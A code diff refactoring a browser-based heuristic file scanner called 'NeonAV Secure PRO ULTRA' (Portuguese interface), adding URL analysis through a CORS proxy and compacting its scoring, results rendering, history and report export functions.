+        suspicious = suspiciousURLs(iocs);
+        if(suspicious.length){
+            score += 5;
+            reasons.push(`${suspicious.length} URL(s) potencialmente suspeita(s)`);
+        }
+    }
+
+    score = Math.min(score, 100);
+    const risk = riskFromScore(score);
+
+    return {
+        id:uuid(), name:file.name, size:file.size, type:file.type || "desconhecido",
+        modified:file.lastModified, timestamp:Date.now(), score, risk:risk.level,
+        riskLabel:risk.label, hash, entropy, detections:rules.detections,
+        iocs, suspiciousURLs:suspicious, reasons
+    };
 }
-
-if(score <= 15){
-
-return {
-level:"high",
-label:"ALTO"
-};
-
-}
-
-return {
-level:"critical",
-label:"CRÍTICO"
-};
-
-}
-
 
 /* =========================================================
-   ANALISAR ARQUIVO
+   ANÁLISE DE URL VIA PROXY CORS (Opção B)
 ========================================================= */
+async function analyzeURL(targetUrl){
+    if(!targetUrl){
+        toast("Insira uma URL válida");
+        return;
+    }
+    if(!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://")){
+        targetUrl = "https://" + targetUrl;
+    }
 
-async function analyzeFile(file,index,total){
+    log(`Iniciando análise da URL: ${targetUrl}`, "URL");
+    toast("Baixando conteúdo da URL...");
 
-const maxMB =
-Number($("sizeLimit").value);
+    try {
+        const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(targetUrl)}`;
+        const response = await fetch(proxyUrl);
+        if(!response.ok) throw new Error(`Erro HTTP: ${response.status}`);
 
-const maxBytes =
-maxMB * 1024 * 1024;
+        const data = await response.json();
+        const htmlContent = data.contents || "";
 
-log(
-`Analisando ${file.name}`,
-"SCAN"
-);
+        if(!htmlContent.trim()){
+            throw new Error("A página retornou conteúdo vazio ou bloqueou o acesso.");
+        }
 
-if(file.size > maxBytes){
+        const simulatedBlob = new Blob([htmlContent], { type: "text/html" });
+        const simulatedFile = new File([simulatedBlob], targetUrl, {
+            type: "text/html",
+            lastModified: Date.now()
+        });
 
-log(
-`${file.name}: tamanho excede ${maxMB} MB`,
-"WARNING"
-);
+        const result = await analyzeFile(simulatedFile, 0, 1);
+        result.name = targetUrl;
+        result.type = "Website / URL";
 
-return {
+        resultsData.unshift(result);
+        saveHistory();
+        renderResults();
+        updateDashboard();
 
-id:uuid(),
+        toast("Análise de URL concluída!");
+        log(`URL analisada com sucesso: ${targetUrl} (Score: ${result.score})`, "DONE");
 
-name:file.name,
-
-size:file.size,
-
-type:file.type || "desconhecido",
-
-modified:file.lastModified,
-
-timestamp:Date.now(),
-
-score:0,
-
-risk:"medium",
-
-riskLabel:"NÃO ANALISADO",
-
-error:
-`Arquivo excede o limite de ${maxMB} MB.`,
-
-hash:"",
-
-entropy:0,
-
-detections:[],
-
-iocs:[],
-
-suspiciousURLs:[]
-
-};
-
+    } catch (error) {
+        log(`Erro ao analisar URL: ${error.message}`, "ERROR");
+        toast("Falha ao analisar URL (verifique CORS)");
+    }
 }
 
-
-const buffer =
-await file.arrayBuffer();
-
-
-let hash = "";
-
-try{
-
-hash = await sha512(buffer);
-
-}catch(error){
-
-log(
-"Erro no SHA-512: "+error.message,
-"ERROR"
-);
-
-}
-
-
-const bytes =
-new Uint8Array(buffer);
-
-
-const entropy =
-$("cfgEntropy").checked
-?
-calculateByteEntropy(bytes)
-:
-0;
-
-
-const text =
-await readTextSafely(file);
-
-
-const rules =
-runRules(text);
-
-
-let score =
-rules.score;
-
-
-const reasons = [];
-
-
-for(const detection of rules.detections){
-
-reasons.push(
-`${detection.rule}: ${detection.patterns.join(", ")}`
-);
-
-}
-
-
-/* extensão */
-
-if(
-$("cfgExtension").checked
-){
-
-const lowerName =
-file.name.toLowerCase();
-
-const extension =
-"."+
-(
-lowerName.includes(".")
-?
-lowerName.split(".").pop()
-:
-""
-);
-
-if(
-SUSPICIOUS_EXTENSIONS.includes(extension)
-){
-
-score += 3;
-
-reasons.push(
-`Extensão potencialmente executável/sensível: ${extension}`
-);
-
-}
-
-}
-
-
-/* entropia */
-
-if(
-$("cfgEntropy").checked &&
-entropy >= 7.2
-){
-
-score += 5;
-
-reasons.push(
-`Entropia de bytes elevada: ${entropy.toFixed(2)} bits`
-);
-
-}
-
-
-/* IOC */
-
-let iocs = [];
-
-if(
-$("cfgIoc").checked
-){
-
-iocs = detectIOCs(text);
-
-if(iocs.length){
-
-reasons.push(
-`${iocs.length} IOC(s) detectado(s)`
-);
-
-}
-
-}
-
-
-/* URLs */
-
-let suspicious = [];
-
-if(
-$("cfgUrls").checked
-){
-
-suspicious =
-suspiciousURLs(iocs);
-
-if(suspicious.length){
-
-score += 5;
-
-reasons.push(
-`${suspicious.length} URL(s) potencialmente suspeita(s)`
-);
-
-}
-
-}
-
-
-/* limite */
-
-score =
-Math.min(score,100);
-
-
-const risk =
-riskFromScore(score);
-
-
-return {
-
-id:uuid(),
-
-name:file.name,
-
-size:file.size,
-
-type:file.type || "desconhecido",
-
-modified:file.lastModified,
-
-timestamp:Date.now(),
-
-score,
-
-risk:risk.level,
-
-riskLabel:risk.label,
-
-hash,
-
-entropy,
-
-detections:rules.detections,
-
-iocs,
-
-suspiciousURLs:suspicious,
-
-reasons
-
-};
-
-}
-
+$("scanUrlBtn").addEventListener("click", () => {
+    const urlInput = $("urlInput");
+    analyzeURL(urlInput.value.trim());
+    urlInput.value = "";
+});
 
 /* =========================================================
    PROCESSAR FILA
 ========================================================= */
-
 async function scanFiles(){
+    if(scanning) return;
+    if(!filesQueue.length){
+        toast("Nenhum arquivo selecionado");
+        return;
+    }
 
-if(scanning){
+    scanning = true;
+    scanBtn.disabled = true;
+    progressBar.style.width = "0%";
+    progressText.textContent = "Iniciando análise...";
+    resultsData = [];
 
-return;
+    for(let i=0; i<filesQueue.length; i++){
+        const file = filesQueue[i];
+        progressText.textContent = `Analisando ${i+1} de ${filesQueue.length}: ${file.name}`;
+        try {
+            const result = await analyzeFile(file, i, filesQueue.length);
+            resultsData.push(result);
+        } catch(error){
+            log(`${file.name}: ${error.message}`, "ERROR");
+            resultsData.push({
+                id:uuid(), name:file.name, size:file.size, type:file.type || "desconhecido",
+                timestamp:Date.now(), score:0, risk:"medium", riskLabel:"ERRO",
+                hash:"", entropy:0, detections:[], iocs:[], suspiciousURLs:[], error:error.message
+            });
+        }
+        progressBar.style.width = (((i+1)/filesQueue.length)*100) + "%";
+    }
 
+    saveHistory();
+    renderResults();
+    updateDashboard();
+    filesQueue = [];
+    scanning = false;
+    scanBtn.disabled = false;
+    progressText.textContent = `Análise concluída: ${resultsData.length} arquivo(s).`;
+    toast("ANÁLISE CONCLUÍDA");
+    log(`${resultsData.length} arquivo(s) analisado(s).`, "DONE");
 }
-
-if(!filesQueue.length){
-
-toast("Nenhum arquivo selecionado");
-
-return;
-
-}
-
-scanning = true;
-
-scanBtn.disabled = true;
-
-progressBar.style.width = "0%";
-
-progressText.textContent =
-"Iniciando análise...";
-
-resultsData = [];
-
-
-for(
-let i=0;
-i<filesQueue.length;
-i++
-){
-
-const file =
-filesQueue[i];
-
-progressText.textContent =
-`Analisando ${i+1} de ${filesQueue.length}: ${file.name}`;
-
-try{
-
-const result =
-await analyzeFile(
-file,
-i,
-filesQueue.length
-);
-
-resultsData.push(result);
-
-}catch(error){
-
-log(
-`${file.name}: ${error.message}`,
-"ERROR"
-);
-
-resultsData.push({
-
-id:uuid(),
-
-name:file.name,
-
-size:file.size,
-
-type:file.type || "desconhecido",
-
-timestamp:Date.now(),
-
-score:0,
-
-risk:"medium",
-
-riskLabel:"ERRO",
-
-hash:"",
-
-entropy:0,
-
-detections:[],
-
-iocs:[],
-
-suspiciousURLs:[],
-
-error:error.message
-
-});
-
-}
-
-const percent =
-((i+1)/filesQueue.length)*100;
-
-progressBar.style.width =
-percent+"%";
-
-}
-
-saveHistory();
-
-renderResults();
-
-updateDashboard();
-
-filesQueue = [];
-
-scanning = false;
-
-scanBtn.disabled = false;
-
-progressText.textContent =
-`Análise concluída: ${resultsData.length} arquivo(s).`;
-
-toast("ANÁLISE CONCLUÍDA");
-
-log(
-`${resultsData.length} arquivo(s) analisado(s).`,
-"DONE"
-);
-
-}
-
 
 /* =========================================================
-   RENDER RESULTADOS
+   RENDER RESULTADOS & DASHBOARD
 ========================================================= */
-
 function renderResults(){
+    const query = searchInput.value.toLowerCase().trim();
+    const filter = riskFilter.value;
+    const sort = sortSelect.value;
 
-const query =
-searchInput.value.toLowerCase().trim();
+    let list = resultsData.filter(item => {
+        const searchable = [
+            item.name, item.hash, item.type, item.riskLabel,
+            ...(item.iocs || []).map(x => x.value)
+        ].join(" ").toLowerCase();
 
-const filter =
-riskFilter.value;
+        const matchesSearch = !query || searchable.includes(query);
+        const matchesRisk = filter === "all" || item.risk === filter;
+        return matchesSearch && matchesRisk;
+    });
 
-const sort =
-sortSelect.value;
+    if(sort === "score") list.sort((a,b) => b.score - a.score);
+    else if(sort === "name") list.sort((a,b) => a.name.localeCompare(b.name));
+    else if(sort === "size") list.sort((a,b) => b.size - a.size);
+    else list.sort((a,b) => b.timestamp - a.timestamp);
 
+    if(!list.length){
+        resultsBox.innerHTML = `<div class="empty">Nenhum resultado encontrado.</div>`;
+        return;
+    }
 
-let list =
-resultsData.filter(item=>{
-
-const searchable = [
-
-item.name,
-item.hash,
-item.type,
-item.riskLabel,
-...(item.iocs || []).map(x=>x.value)
-
-]
-.join(" ")
-.toLowerCase();
-
-const matchesSearch =
-!query ||
-searchable.includes(query);
-
-const matchesRisk =
-filter === "all" ||
-item.risk === filter;
-
-return matchesSearch &&
-matchesRisk;
-
-});
-
-
-if(sort === "score"){
-
-list.sort(
-(a,b)=>b.score-a.score
-);
-
-}else if(sort === "name"){
-
-list.sort(
-(a,b)=>a.name.localeCompare(b.name)
-);
-
-}else if(sort === "size"){
-
-list.sort(
-(a,b)=>b.size-a.size
-);
-
-}else{
-
-list.sort(
-(a,b)=>b.timestamp-a.timestamp
-);
-
+    resultsBox.innerHTML = list.map(renderResult).join("");
 }
-
-
-if(!list.length){
-
-resultsBox.innerHTML = `
-<div class="empty">
-Nenhum resultado encontrado.
-</div>
-`;
-
-return;
-
-}
-
-
-resultsBox.innerHTML =
-list.map(renderResult).join("");
-
-}
-
-
-/* =========================================================
-   RESULTADO INDIVIDUAL
-========================================================= */
 
 function renderResult(item){
+    const reasons = (item.reasons || []).map(r => `<li>${escapeHTML(r)}</li>`).join("");
+    const iocs = (item.iocs || []).map(i => `<span class="ioc">${escapeHTML(i.type)}: ${escapeHTML(i.value)}</span>`).join("");
+    const detectionCount = (item.detections || []).length;
 
-const reasons =
-(item.reasons || []).map(
-reason=>`<li>${escapeHTML(reason)}</li>`
-).join("");
+    return `
+    <article class="result ${item.risk}">
+    <div class="result-head">
+    <div>
+    <div class="filename">${escapeHTML(item.name)}</div>
+    <div class="meta">${escapeHTML(item.type)} • ${formatBytes(item.size)} • ${formatDate(item.timestamp)}</div>
+    </div>
+    <div>
+    <div class="badge ${item.risk}">${escapeHTML(item.riskLabel)}</div>
+    <div class="score">${item.score}</div>
+    </div>
+    </div>
 
+    <div class="result-grid">
+    <div class="info"><small>SHA-512</small><div class="hash" title="${escapeHTML(item.hash)}">${escapeHTML(item.hash || "Indisponível")}</div></div>
+    <div class="info"><small>Entropia</small><strong>${Number(item.entropy || 0).toFixed(2)}</strong></div>
+    <div class="info"><small>Regras</small><strong>${detectionCount}</strong></div>
+    <div class="info"><small>IOCs</small><strong>${(item.iocs || []).length}</strong></div>
+    </div>
 
-const iocs =
-(item.iocs || []).map(
-ioc=>
-`<span class="ioc">
-${escapeHTML(ioc.type)}:
-${escapeHTML(ioc.value)}
-</span>`
-).join("");
+    ${item.error ? `<div style="margin-top:12px;color:var(--red)">⚠️ ${escapeHTML(item.error)}</div>` : ''}
 
+    ${reasons ? `<div class="reasons"><strong>🧠 Indicadores detectados</strong><ul>${reasons}</ul></div>` : `<div class="reasons"><span style="color:var(--green)">✓ Nenhum indicador heurístico relevante encontrado.</span></div>`}
 
-const detectionCount =
-(item.detections || []).length;
+    ${iocs ? `<div class="reasons"><strong>🌐 IOCs</strong><div>${iocs}</div></div>` : ''}
 
-
-return `
-
-<article class="result ${item.risk}">
-
-<div class="result-head">
-
-<div>
-
-<div class="filename">
-${escapeHTML(item.name)}
-</div>
-
-<div class="meta">
-
-${escapeHTML(item.type)}
-•
-${formatBytes(item.size)}
-•
-${formatDate(item.timestamp)}
-
-</div>
-
-</div>
-
-<div>
-
-<div class="badge ${item.risk}">
-${escapeHTML(item.riskLabel)}
-</div>
-
-<div class="score">
-${item.score}
-</div>
-
-</div>
-
-</div>
-
-
-<div class="result-grid">
-
-<div class="info">
-
-<small>SHA-512</small>
-
-<div
-class="hash"
-title="${escapeHTML(item.hash)}"
->
-${escapeHTML(item.hash || "Indisponível")}
-</div>
-
-</div>
-
-
-<div class="info">
-
-<small>Entropia</small>
-
-<strong>
-${Number(item.entropy || 0).toFixed(2)}
-</strong>
-
-</div>
-
-
-<div class="info">
-
-<small>Regras</small>
-
-<strong>
-${detectionCount}
-</strong>
-
-</div>
-
-
-<div class="info">
-
-<small>IOCs</small>
-
-<strong>
-${(item.iocs || []).length}
-</strong>
-
-</div>
-
-</div>
-
-
-${
-item.error
-?
-`
-<div style="margin-top:12px;color:var(--red)">
-⚠️ ${escapeHTML(item.error)}
-</div>
-`
-:
-""
+    <div class="actions">
+    <button class="btn" data-copy="${escapeHTML(item.hash)}">📋 Copiar SHA-512</button>
+    <button class="btn" data-export="${escapeHTML(item.id)}">📄 Exportar</button>
+    </div>
+    </article>
+    `;
 }
-
-
-${
-reasons
-?
-`
-<div class="reasons">
-
-<strong>
-🧠 Indicadores detectados
-</strong>
-
-<ul>
-${reasons}
-</ul>
-
-</div>
-`
-:
-`
-<div class="reasons">
-<span style="color:var(--green)">
-✓ Nenhum indicador heurístico relevante encontrado.
-</span>
-</div>
-`
-}
-
-
-${
-iocs
-?
-`
-<div class="reasons">
-
-<strong>
-🌐 IOCs
-</strong>
-
-<div>
-${iocs}
-</div>
-
-</div>
-`
-:
-""
-}
-
-
-<div class="actions">
-
-<button
-class="btn"
-data-copy="${escapeHTML(item.hash)}"
->
-📋 Copiar SHA-512
-</button>
-
-<button
-class="btn"
-data-export="${escapeHTML(item.id)}"
->
-📄 Exportar
-</button>
-
-</div>
-
-</article>
-
-`;
-
-}
-
-
-/* =========================================================
-   DASHBOARD
-========================================================= */
 
 function updateDashboard(){
+    const total = resultsData.length;
+    const low = resultsData.filter(x => x.risk === "low").length;
+    const medium = resultsData.filter(x => x.risk === "medium").length;
+    const high = resultsData.filter(x => x.risk === "high").length;
+    const critical = resultsData.filter(x => x.risk === "critical").length;
 
-const total =
-resultsData.length;
+    $("totalFiles").textContent = total;
+    $("lowCount").textContent = low;
+    $("mediumCount").textContent = medium;
+    $("highCount").textContent = high;
+    $("criticalCount").textContent = critical;
 
-const low =
-resultsData.filter(
-x=>x.risk==="low"
-).length;
+    const average = total ? resultsData.reduce((sum, item) => sum + item.score, 0) / total : 0;
+    $("averageScore").textContent = average.toFixed(1);
 
-const medium =
-resultsData.filter(
-x=>x.risk==="medium"
-).length;
+    const percentages = {
+        low: total ? low/total*100 : 0,
+        medium: total ? medium/total*100 : 0,
+        high: total ? high/total*100 : 0,
+        critical: total ? critical/total*100 : 0
+    };
 
-const high =
-resultsData.filter(
-x=>x.risk==="high"
-).length;
-
-const critical =
-resultsData.filter(
-x=>x.risk==="critical"
-).length;
-
-
-$("totalFiles").textContent = total;
-$("lowCount").textContent = low;
-$("mediumCount").textContent = medium;
-$("highCount").textContent = high;
-$("criticalCount").textContent = critical;
-
-
-const average =
-total
-?
-resultsData.reduce(
-(sum,item)=>sum+item.score,
-0
-)/total
-:
-0;
-
-$("averageScore").textContent =
-average.toFixed(1);
-
-
-const percentages = {
-
-low: total ? low/total*100 : 0,
-
-medium: total ? medium/total*100 : 0,
-
-high: total ? high/total*100 : 0,
-
-critical: total ? critical/total*100 : 0
-
-};
-
-
-for(const key of Object.keys(percentages)){
-
-$(`${key}Percent`).textContent =
-percentages[key].toFixed(0)+"%";
-
-$(`${key}Fill`).style.width =
-percentages[key]+"%";
-
+    for(const key of Object.keys(percentages)){
+        $(`${key}Percent`).textContent = percentages[key].toFixed(0) + "%";
+        $(`${key}Fill`).style.width = percentages[key] + "%";
+    }
 }
-
-}
-
 
 /* =========================================================
-   HISTÓRICO
+   HISTÓRICO & EXPORTAÇÃO
 ========================================================= */
-
 function saveHistory(){
-
-try{
-
-const old =
-JSON.parse(
-localStorage.getItem(STORAGE_KEY) || "[]"
-);
-
-const merged =
-[...resultsData,...old]
-.slice(0,500);
-
-localStorage.setItem(
-STORAGE_KEY,
-JSON.stringify(merged)
-);
-
-}catch(error){
-
-log(
-"Não foi possível salvar histórico.",
-"WARNING"
-);
-
+    try {
+        const old = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
+        const merged = [...resultsData, ...old].slice(0, 500);
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(merged));
+    } catch {
+        log("Não foi possível salvar histórico.", "WARNING");
+    }
 }
-
-}
-
 
 function loadHistory(){
-
-try{
-
-const history =
-JSON.parse(
-localStorage.getItem(STORAGE_KEY) || "[]"
-);
-
-if(
-Array.isArray(history) &&
-history.length
-){
-
-resultsData = history;
-
-renderResults();
-
-updateDashboard();
-
-log(
-`${history.length} registro(s) carregado(s).`,
-"HISTORY"
-);
-
+    try {
+        const history = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
+        if(Array.isArray(history) && history.length){
+            resultsData = history;
+            renderResults();
+            updateDashboard();
+            log(`${history.length} registro(s) carregado(s).`, "HISTORY");
+        }
+    } catch(e) { console.error(e); }
 }
 
-}catch(error){
-
-console.error(error);
-
+function downloadFile(content, filename, type){
+    const blob = new Blob([content], { type });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    setTimeout(() => URL.revokeObjectURL(url), 1000);
 }
-
-}
-
-
-/* =========================================================
-   EXPORTAÇÃO
-========================================================= */
-
-function downloadFile(
-content,
-filename,
-type
-){
-
-const blob =
-new Blob(
-[content],
-{type}
-);
-
-const url =
-URL.createObjectURL(blob);
-
-const a =
-document.createElement("a");
-
-a.href = url;
-
-a.download = filename;
-
-document.body.appendChild(a);
-
-a.click();
-
-a.remove();
-
-setTimeout(
-()=>URL.revokeObjectURL(url),
-1000
-);
-
-}
-
 
 function exportJSON(){
-
-if(!resultsData.length){
-
-toast("Nenhum resultado");
-
-return;
-
+    if(!resultsData.length){ toast("Nenhum resultado"); return; }
+    downloadFile(JSON.stringify(resultsData, null, 2), "neonav-relatorio.json", "application/json");
+    log("Relatório JSON exportado.", "EXPORT");
 }
-
-downloadFile(
-JSON.stringify(resultsData,null,2),
-"neonav-relatorio.json",
-"application/json"
-);
-
-log(
-"Relatório JSON exportado.",
-"EXPORT"
-);
-
-}
-
 
 function csvEscape(value){
-
-const text =
-String(value ?? "");
-
-return `"${text.replace(/"/g,'""')}"`;
-
+    return `"${String(value ?? "").replace(/"/g,'""')}"`;
 }
-
 
 function exportCSV(){
+    if(!resultsData.length){ toast("Nenhum resultado"); return; }
+    const headers = ["Arquivo", "Tamanho", "Tipo", "Risco", "Score", "Entropia", "SHA-512", "Regras", "IOCs", "Data"];
+    const rows = resultsData.map(item => [
+        item.name, item.size, item.type, item.riskLabel, item.score,
+        Number(item.entropy || 0).toFixed(2), item.hash,
+        (item.detections || []).map(x => x.rule).join("; "),
+        (item.iocs || []).map(x => x.value).join("; "),
+        formatDate(item.timestamp)
+    ].map(csvEscape).join(","));
 
-if(!resultsData.length){
-
-toast("Nenhum resultado");
-
-return;
-
+    const csv = [headers.map(csvEscape).join(","), ...rows].join("\n");
+    downloadFile("\uFEFF" + csv, "neonav-relatorio.csv", "text/csv;charset=utf-8");
+    log("Relatório CSV exportado.", "EXPORT");
 }
-
-const headers = [
-
-"Arquivo",
-"Tamanho",
-"Tipo",
-"Risco",
-"Score",
-"Entropia",
-"SHA-512",
-"Regras",
-"IOCs",
-"Data"
-
-];
-
-
-const rows =
-resultsData.map(item=>[
-
-item.name,
-
-item.size,
-
-item.type,
-
-item.riskLabel,
-
-item.score,
-
-Number(item.entropy || 0).toFixed(2),
-
-item.hash,
-
-(item.detections || [])
-.map(x=>x.rule)
-.join("; "),
-
-(item.iocs || [])
-.map(x=>x.value)
-.join("; "),
-
-formatDate(item.timestamp)
-
-].map(csvEscape).join(","));
-
-
-const csv =
-[
-headers.map(csvEscape).join(","),
-...rows
-].join("\n");
-
-
-downloadFile(
-"\uFEFF"+csv,
-"neonav-relatorio.csv",
-"text/csv;charset=utf-8"
-);
-
-log(
-"Relatório CSV exportado.",
-"EXPORT"
-);
-
-}
-
-
-/* =========================================================
-   RELATÓRIO HTML
-========================================================= */
 
 function exportHTML(){
+    if(!resultsData.length){ toast("Nenhum resultado"); return; }
+    const rows = resultsData.map(item => `
+        <tr>
+        <td>${escapeHTML(item.name)}</td>
+        <td>${escapeHTML(item.riskLabel)}</td>
+        <td>${item.score}</td>
+        <td>${Number(item.entropy||0).toFixed(2)}</td>
+        <td><code>${escapeHTML(item.hash)}</code></td>
+        <td>${escapeHTML((item.reasons||[]).join(" | "))}</td>
+        </tr>
+    `).join("");
 
-if(!resultsData.length){
-
-toast("Nenhum resultado");
-
-return;
-
+    const html = `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><title>Relatório NeonAV</title><style>body{font-family:Arial;background:#07110b;color:#eafff2;padding:30px;}h1{color:#00ff88;}table{width:100%;border-collapse:collapse;}th,td{padding:10px;border:1px solid #17472d;text-align:left;}th{background:#0c2417;}code{font-size:10px;word-break:break-all;}</style></head><body><h1>NeonAV Secure PRO ULTRA</h1><p>Relatório gerado em ${escapeHTML(formatDate(Date.now()))}</p><table><thead><tr><th>Arquivo</th><th>Risco</th><th>Score</th><th>Entropia</th><th>SHA-512</th><th>Indicadores</th></tr></thead><tbody>${rows}</tbody></table></body></html>`;
+    downloadFile(html, "neonav-relatorio.html", "text/html;charset=utf-8");
+    log("Relatório HTML exportado.", "EXPORT");
 }
-
-
-const rows =
-resultsData.map(item=>`
-
-<tr>
-
-<td>${escapeHTML(item.name)}</td>
-
-<td>${escapeHTML(item.riskLabel)}</td>
-
-<td>${item.score}</td>
-
-<td>${Number(item.entropy||0).toFixed(2)}</td>
-
-<td>
-<code>${escapeHTML(item.hash)}</code>
-</td>
-
-<td>
-${escapeHTML(
-(item.reasons||[]).join(" | ")
-)}
-</td>
-
-</tr>
-
-`).join("");
-
-
-const html = `
-
-<!DOCTYPE html>
-
-<html lang="pt-BR">
-
-<head>
-
-<meta charset="UTF-8">
-
-<title>NeonAV Secure PRO ULTRA - Relatório</title>
-
-<style>
-
-body{
-font-family:Arial;
-background:#07110b;
-color:#eafff2;
-padding:30px;
-}
-
-h1{
-color:#00ff88;
-}
-
-table{
-width:100%;
-border-collapse:collapse;
-}
-
-th,td{
-padding:10px;
-border:1px solid #17472d;
-text-align:left;
-vertical-align:top;
-}
-
-th{
-background:#0c2417;
-}
-
-code{
-font-size:10px;
-word-break:break-all;
-}
-
-</style>
-
-</head>
-
-<body>
-
-<h1>NeonAV Secure PRO ULTRA</h1>
-
-<p>
-Relatório gerado em ${escapeHTML(formatDate(Date.now()))}
-</p>
-
-<table>
-
-<thead>
-
-<tr>
-
-<th>Arquivo</th>
-<th>Risco</th>
-<th>Score</th>
-<th>Entropia</th>
-<th>SHA-512</th>
-<th>Indicadores</th>
-
-</tr>
-
-</thead>
-
-<tbody>
-
-${rows}
-
-</tbody>
-
-</table>
-
-</body>
-
-</html>
-`;
-
-
-downloadFile(
-html,
-"neonav-relatorio.html",
-"text/html;charset=utf-8"
-);
-
-log(
-"Relatório HTML exportado.",
-"EXPORT"
-);
-
-}
-
 
 /* =========================================================
-   ARQUIVOS
+   EVENTOS & LABORATÓRIO
 ========================================================= */
-
 function addFiles(files){
-
-const incoming =
-Array.from(files || []);
-
-if(!incoming.length){
-return;
+    const incoming = Array.from(files || []);
+    if(!incoming.length) return;
+    filesQueue.push(...incoming);
+    log(`${incoming.length} arquivo(s) adicionado(s) à fila.`, "QUEUE");
+    progressText.textContent = `${filesQueue.length} arquivo(s) aguardando análise.`;
+    toast(`${filesQueue.length} arquivo(s) na fila`);
 }
 
-filesQueue.push(...incoming);
+selectBtn.addEventListener("click", () => fileInput.click());
+fileInput.addEventListener("change", event => { addFiles(event.target.files); fileInput.value = ""; });
 
-log(
-`${incoming.length} arquivo(s) adicionado(s) à fila.`,
-"QUEUE"
-);
+["dragenter", "dragover"].forEach(name => {
+    dropzone.addEventListener(name, e => { e.preventDefault(); dropzone.classList.add("drag"); });
+});
+["dragleave", "drop"].forEach(name => {
+    dropzone.addEventListener(name, e => { e.preventDefault(); dropzone.classList.remove("drag"); });
+});
+dropzone.addEventListener("drop", e => addFiles(e.dataTransfer.files));
+scanBtn.addEventListener("click", scanFiles);
 
-progressText.textContent =
-`${filesQueue.length} arquivo(s) aguardando análise.`;
+searchInput.addEventListener("input", renderResults);
+riskFilter.addEventListener("change", renderResults);
+sortSelect.addEventListener("change", renderResults);
 
-toast(
-`${filesQueue.length} arquivo(s) na fila`
-);
-
-}
-
-
-/* =========================================================
-   EVENTOS DE ARQUIVOS
-========================================================= */
-
-selectBtn.addEventListener(
-"click",
-()=>fileInput.click()
-);
-
-fileInput.addEventListener(
-"change",
-event=>{
-addFiles(event.target.files);
-fileInput.value = "";
-}
-);
-
-
-[
-"dragenter",
-"dragover"
-].forEach(eventName=>{
-
-dropzone.addEventListener(
-eventName,
-event=>{
-
-event.preventDefault();
-
-dropzone.classList.add("drag");
-
-}
-);
-
+resultsBox.addEventListener("click", async event => {
+    const copy = event.target.closest("[data-copy]");
+    if(copy){
+        const hash = copy.getAttribute("data-copy");
+        if(!hash) return;
+        try {
+            await navigator.clipboard.writeText(hash);
+            toast("SHA-512 copiado");
+        } catch { toast("Não foi possível copiar"); }
+    }
+    const exportButton = event.target.closest("[data-export]");
+    if(exportButton){
+        const id = exportButton.getAttribute("data-export");
+        const item = resultsData.find(x => x.id === id);
+        if(!item) return;
+        downloadFile(JSON.stringify(item, null, 2), "neonav-"+item.name+".json", "application/json");
+    }
 });
 
-
-[
-"dragleave",
-"drop"
-].forEach(eventName=>{
-
-dropzone.addEventListener(
-eventName,
-event=>{
-
-event.preventDefault();
-
-dropzone.classList.remove("drag");
-
-}
-);
-
+$("clearBtn").addEventListener("click", () => {
+    if(!confirm("Limpar histórico e resultados?")) return;
+    resultsData = [];
+    filesQueue = [];
+    localStorage.removeItem(STORAGE_KEY);
+    renderResults();
+    updateDashboard();
+    progressBar.style.width = "0%";
+    progressText.textContent = "Histórico limpo.";
+    log("Histórico removido.", "CLEAR");
 });
 
-
-dropzone.addEventListener(
-"drop",
-event=>{
-
-addFiles(event.dataTransfer.files);
-
-}
-);
-
-
-scanBtn.addEventListener(
-"click",
-scanFiles
-);
-
-
-/* =========================================================
-   FILTROS
-========================================================= */
-
-searchInput.addEventListener(
-"input",
-renderResults
-);
-
-riskFilter.addEventListener(
-"change",
-renderResults
-);
-
-sortSelect.addEventListener(
-"change",
-renderResults
-);
-
-
-/* =========================================================
-   COPIAR HASH / EXPORTAR INDIVIDUAL
-========================================================= */
-
-resultsBox.addEventListener(
-"click",
-async event=>{
-
-const copy =
-event.target.closest("[data-copy]");
-
-if(copy){
-
-const hash =
-copy.getAttribute("data-copy");
-
-if(!hash){
-
-toast("Hash indisponível");
-
-return;
-
-}
-
-try{
-
-if(
-navigator.clipboard &&
-window.isSecureContext
-){
-
-await navigator.clipboard.writeText(hash);
-
-}else{
-
-const textarea =
-document.createElement("textarea");
-
-textarea.value = hash;
-
-textarea.style.position =
-"fixed";
-
-textarea.style.opacity = "0";
-
-document.body.appendChild(textarea);
-
-textarea.focus();
-
-textarea.select();
-
-document.execCommand("copy");
-
-textarea.remove();
-
-}
-
-toast("SHA-512 copiado");
-
-}catch{
-
-toast("Não foi possível copiar");
-
-}
-
-}
-
-
-const exportButton =
-event.target.closest("[data-export]");
-
-if(exportButton){
-
-const id =
-exportButton.getAttribute("data-export");
-
-const item =
-resultsData.find(
-x=>x.id===id
-);
-
-if(!item){
-return;
-}
-
-downloadFile(
-JSON.stringify(item,null,2),
-"neonav-"+item.name+".json",
-"application/json"
-);
-
-}
-
-}
-);
-
-
-/* =========================================================
-   LIMPAR
-========================================================= */
-
-$("clearBtn").addEventListener(
-"click",
-()=>{
-
-if(
-!confirm(
-"Limpar histórico e resultados?"
-)
-){
-
-return;
-
-}
-
-resultsData = [];
-
-filesQueue = [];
-
-localStorage.removeItem(
-STORAGE_KEY
-);
-
-renderResults();
-
-updateDashboard();
-
-progressBar.style.width = "0%";
-
-progressText.textContent =
-"Histórico limpo.";
-
-log(
-"Histórico removido.",
-"CLEAR"
-);
-
-}
-);
-
-
-/* =========================================================
-   EXPORTAÇÕES
-========================================================= */
-
-$("jsonBtn").addEventListener(
-"click",
-exportJSON
-);
-
-$("csvBtn").addEventListener(
-"click",
-exportCSV
-);
-
-$("htmlBtn").addEventListener(
-"click",
-exportHTML
-);
-
-
-/* =========================================================
-   LABORATÓRIO
-========================================================= */
-
-$("testBtn").addEventListener(
-"click",
-()=>{
-testModal.classList.add("show");
-}
-);
-
-$("closeModal").addEventListener(
-"click",
-()=>{
-testModal.classList.remove("show");
-}
-);
-
-
-testModal.addEventListener(
-"click",
-event=>{
-
-if(event.target === testModal){
-
-testModal.classList.remove("show");
-
-}
-
-}
-);
-
-
-/* =========================================================
-   CRIAÇÃO DE ARQUIVOS DE TESTE
-========================================================= */
+$("jsonBtn").addEventListener("click", exportJSON);
